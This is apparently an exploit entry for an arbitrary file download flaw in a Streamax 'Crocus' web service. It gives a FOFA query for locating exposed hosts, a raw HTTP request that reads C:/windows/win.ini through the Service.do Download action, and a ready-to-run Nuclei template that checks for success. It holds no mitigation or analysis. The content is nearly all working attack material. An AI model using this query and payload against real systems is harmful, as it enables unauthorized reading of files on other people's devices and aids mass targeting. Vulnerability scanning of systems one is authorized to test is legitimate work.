# fofa

```plain
body="inp_verification"
```

# poc

```http
GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

# nuclei

```yaml
id: streamax-Crocus-download-download

info:
  name: streamax-Crocus-download-download
  author: zxf
  severity: high
  metadata:
    fofasearch: body="inp_verification"
http:
  - raw:
      - |
        GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"[mci extensions]") && contains_all(body,"[extensions]")
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1738999284213-43c70ad8-45bc-4fde-a883-0ddf67df3b38.png)

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1738999320176-351c96c6-bc23-4129-8c89-ad4561c930ab.png)